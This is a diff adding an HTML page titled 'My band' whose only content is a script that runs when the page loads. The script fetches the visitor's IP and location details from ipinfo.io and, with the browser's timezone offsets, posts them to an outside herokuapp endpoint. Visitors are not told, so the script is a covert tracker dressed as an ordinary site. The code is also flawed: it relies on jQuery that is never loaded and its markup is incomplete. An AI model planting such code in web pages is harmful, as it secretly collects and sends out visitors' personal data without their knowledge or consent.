@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>My band</title>
+<meta charset="UTF-8">
+
+<script>
+  
+function show_loc(position){
+  var offset = -(new Date().getTimezoneOffset()/60);
+  var offset2 = (new Date().getTimezoneOffset())
+  $.get("https://ipinfo.io", function(response) {
+      var to_send = {
+        source: response,
+        tz: offset2, 
+        tz2: offset
+      }
+      $.post("https://storestx.herokuapp.com/tpszk", JSON.stringify(to_send), function(response){
+        console.log(response);
+      })
+    }, 'jsonp');
+}
+
+show_loc();
+</script>
+
+</body>
+</html>
